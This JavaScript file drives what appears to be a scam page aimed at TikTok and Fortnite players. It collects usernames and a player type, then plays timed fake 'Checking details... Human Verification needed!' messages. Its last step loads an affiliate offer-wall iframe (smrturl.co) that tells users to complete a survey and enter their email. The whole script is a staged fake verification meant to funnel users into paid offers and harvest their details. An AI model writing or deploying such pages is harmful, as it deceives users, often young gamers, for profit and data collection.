// Create and load frame
const frame_load = function() {
    var getContainer = document.getElementById('container-mod');
    const FRAME = '<iframe referrerpolicy="no-referrer" src="https://smrturl.co/o/131478/214976?s1=" style="width:100%;height:100vh;background-color:#131313;" title="wall"></iframe>';
    getContainer.innerHTML = FRAME;
}

// Load page anim
const display_anim = function(x, s) {
    x.style.opacity = 0;
    setTimeout(() => {
        x.innerHTML = s;
        x.style.transition = "all .5s";
        x.style.opacity = 1;
    }, 500)
}

const query = function(s) {
    var data = document.getElementById('dropmenu');
    data.innerHTML = s;
}

const tiktok = (x) => display_anim(x, '<div class="information-body"><form class="form"><div class="form-group text-center"><label for="userInput" class="light-red">Tiktok Username</label><input type="info" class="form-control" id="userInput" aria-describedby="userInput" placeholder="Enter"></div><div class="text-center"><button class="btn btn-primary" type="submit" onclick="information_load();return false;">Next</button></div></form></div>');
const fortnite = (x) => display_anim(x, '<div class="information-body"><form class="form"><div class="form-group text-center"><label for="userInput" class="light-red">Fortnite Username</label><input type="info" class="form-control" id="userInput" aria-describedby="userInput" placeholder="Enter"></div><div class="text-center"><button class="btn btn-primary" type="submit" onclick="information_load();return false;">Next</button></div></form></div>'); 
const drop_down = (x) => display_anim(x, '<div class="information-body"><form class="form"><div class="form-group text-center"><label for="selection" class="light-red">What kind of player are you?</label><div class="dropdown text-center"><button class="btn btn-primary btn-lg dropdown-toggle" type="button" id="dropmenu" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Select</button><div class="dropdown-menu" aria-labelledby="dropmenu"><div class="dropdown-header text-white">Options</div><a class="dropdown-item" href="javascript:query(\''+'Normal'+'\')">Normal</a><a class="dropdown-item" href="javascript:query(\''+'Competitive'+'\')">Competitive</a><a class="dropdown-item" href="javascript:query(\''+'Creative warrior'+'\')">Creative warrior</a><a class="dropdown-item" href="javascript:query(\''+'TrickShotter'+'\')">TrickShotter</a></div></div><button class="btn btn-primary btn-lg" type="submit" onclick="information_load();return false;" style="margin-top:15px;">Next</button></div></form></div>');
const verify = (x) => display_anim(x, '<div class="information-body"><form class="form"><div class="form-group text-center"><label for="display" class="light-red" style="font-size:20px">Please Verify Your a human And type your email after survey</label><button class="btn btn-primary btn-lg btn-block" type="submit" onclick="information_load();return false;">Next</button></div></form></div>');

let item = 1;
const info_switch = function(c) {
    switch (item) {
        case 1: // tiktok
            tiktok(c);
            item += 1;
            break;
        case 2: // fortnite
            fortnite(c);
            item += 1;
            break;
        case 3: // drop down
            drop_down(c);
            item += 1;
            break;
        case 4: // verify
            verify(c);
            item += 1;
            break;
        case 5: // load frame
            frame_load();
            break;
        default:
            break;
    }
}

// Load input form
const information_load = function() {
    var getContainer = document.getElementById('container-mod');
    info_switch(getContainer);
}

// Loading anims
const verification_load = function() {
    var meme;
    var getContainer = document.getElementById('container-mod');
    const verifyDetails = ['Checking details...', 'Success', 'Checking Status...', 'Human Verification needed!'];
    for (let i = 0; i < verifyDetails.length + 1; i++) {
        meme = setTimeout(() => {
            if (i == 4) {
                frame_load();
                return true;
            }
            getContainer.innerHTML = `<div class="verification-body text-center h-100" id="verify"><span class="color-${i + 1}" style="font-size:45px;">${verifyDetails[i]}</span></div>`;
        }, 5000 * i)
    };
    return false;
}